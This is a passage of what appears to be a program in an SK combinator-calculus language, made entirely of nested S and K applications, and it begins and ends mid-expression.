(S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))(((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))((